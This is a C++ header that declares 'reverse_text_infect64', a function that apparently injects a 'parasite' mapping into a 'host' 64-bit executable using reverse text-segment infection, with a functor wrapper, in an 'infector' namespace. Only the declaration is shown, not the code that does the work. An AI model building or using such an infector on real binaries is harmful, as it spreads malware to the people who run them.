#pragma once
#include "common/mmap.hh"

namespace vt::infector {

bool reverse_text_infect64(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                      common::Mmap<PROT_READ> parasite_mapping);

struct ReverseTextInfect {
  bool operator()(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                  common::Mmap<PROT_READ> parasite_mapping) {
    return reverse_text_infect64(vt::move(host_mapping), vt::move(parasite_mapping));
  }
};

}  // namespace vt::infector